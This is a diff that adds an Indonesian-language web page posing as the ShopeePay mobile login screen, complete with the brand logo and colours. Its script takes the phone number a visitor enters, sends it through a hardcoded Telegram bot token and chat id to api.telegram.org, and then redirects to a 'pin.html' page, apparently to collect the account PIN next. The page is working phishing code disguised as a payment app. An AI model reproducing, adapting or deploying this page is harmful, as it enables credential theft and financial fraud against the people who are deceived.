@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ShopeePay</title>
+    <style>
+        /* Reset Default Mobile Browser */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --orange: #ee4d2d;
+            --light-orange: #ffbca6;
+            --bg-input: #f5f5f5;
+            --text-black: #222222;
+            --text-gray: #888888;
+            --mobile-padding: 20px; /* Standar padding mobile */
+        }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            background-color: #ffffff;
+            overflow: hidden; /* Mencegah scroll yang tidak perlu */
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            padding: var(--mobile-padding);
+        }
+
+        /* --- HEADER --- */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 35px;
+        }
+
+        .shopee-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--orange);
+        }
+
+        .shopee-logo img {
+            width: 28px;
+            height: 28px;
+            object-fit: contain;
+        }
+
+        .lang-btn {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            border: 1px solid #e8e8e8;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #555;
+            background: white;
+        }
+
+        /* --- MAIN CONTENT --- */
+        main {
+            flex: 1;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-black);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .sub-title {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        /* --- INPUT FIELD --- */
+        .input-group {
+            display: flex;
+            align-items: center;
+            background-color: var(--bg-input);
+            border-radius: 4px;
+            height: 52px;
+            border: 1px solid transparent;
+            transition: 0.2s;
+        }
+
+        .input-group:focus-within {
+            border-color: var(--orange);
+            background-color: #fff;
+            box-shadow: 0 0 0 0.5px var(--orange);
+        }
+
+        .country-code {
+            padding: 0 15px;
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-black);
+            border-right: 1px solid #ddd;
+        }
+
+        input {
+            flex: 1;
+            border: none;
+            background: transparent;
+            padding: 0 15px;
+            font-size: 16px;
+            outline: none;
+            color: var(--text-black);
+            width: 100%;
+        }
+
+        input::placeholder {
+            color: #bbb;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            padding-bottom: 10px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: var(--orange);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-submit:disabled {
+            background-color: var(--light-orange);
+            cursor: not-allowed;
+        }
+
+        .btn-submit:active {
+            opacity: 0.8;
+        }
+
+        /* Utility untuk SVG */
+        .svg-icon {
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="shopee-logo">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjH0dLtbGAkgEXuUUVPIWL2vOWDPCp6EOaGXjq3xpi61nitsMFbKDsGCcXbkZL8MOc5Q2EhOxQKx0feqqO01ehp3T0OcbUen3etxZLbYlg4ckVDl_0_P7FDPQYBgga0Gj1BAN0hJtaaFxvk6kXr5GQ_OR8kHdONmtKqTDD9I0_ieZv8KpFijsFfposiHEF0/s1250/template-logo-shopeepay-vector.png" alt="S">
+            <span>Pay</span>
+        </div>
+        <button class="lang-btn">
+            <svg class="svg-icon" width="16" height="16" viewBox="0 0 24 24">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="2" y1="12" x2="22" y2="12"></line>
+                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+            </svg>
+            ID
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                <polyline points="6 9 12 15 18 9"></polyline>
+            </svg>
+        </button>
+    </header>
+
+    <main>
+        <h1>Lanjut dengan no. handphone</h1>
+        <p class="sub-title">Untuk mengidentifikasi akun ShopeePay Anda</p>
+
+        <div class="input-group">
+            <div class="country-code">+62</div>
+            <input type="tel" id="phone" placeholder="Masukkan nomor no. handphone" inputmode="numeric">
+        </div>
+    </main>
+
+    <footer>
+        <button class="btn-submit" id="submitBtn" disabled>Lanjutkan</button>
+    </footer>
+
+    <script>
+    const phoneInput = document.getElementById('phone');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Validasi tombol aktif (minimal 9 digit)
+    phoneInput.addEventListener('input', (e) => {
+        // Hanya izinkan angka
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        submitBtn.disabled = e.target.value.length < 9;
+    });
+
+    // Fungsi saat tombol "Lanjutkan" diklik
+    submitBtn.addEventListener('click', async () => {
+        const phoneNumber = phoneInput.value;
+
+        // 1. SIMPAN KE LOCAL STORAGE
+        localStorage.setItem('userPhone', phoneNumber);
+        console.log('Nomor tersimpan di local storage:', localStorage.getItem('userPhone'));
+
+        // 2. KONFIGURASI TELEGRAM
+        const token = '8316280054:AAGlD7WDlLDzFjfjuEBm87HMHXQ11yMQGSg';
+        const chat_id = '5689726675';
+        const message = `📱 No. HP Baru: +62${phoneNumber}\n`;
+
+        // UI Loading
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Memproses...';
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chat_id, 
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            if (response.ok) {
+                location.href = "pin.html";
+            } else {
+                throw new Error('Gagal mengirim ke Telegram');
+            }
+        } catch (e) {
+            alert('Terjadi kesalahan. Nomor tetap tersimpan di perangkat ini.');
+            console.error(e);
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Lanjutkan';
+        }
+    });
+
+    // Opsional: Muat nomor otomatis jika sudah pernah tersimpan sebelumnya
+    window.addEventListener('load', () => {
+        const savedPhone = localStorage.getItem('userPhone');
+        if (savedPhone) {
+            phoneInput.value = savedPhone;
+            submitBtn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
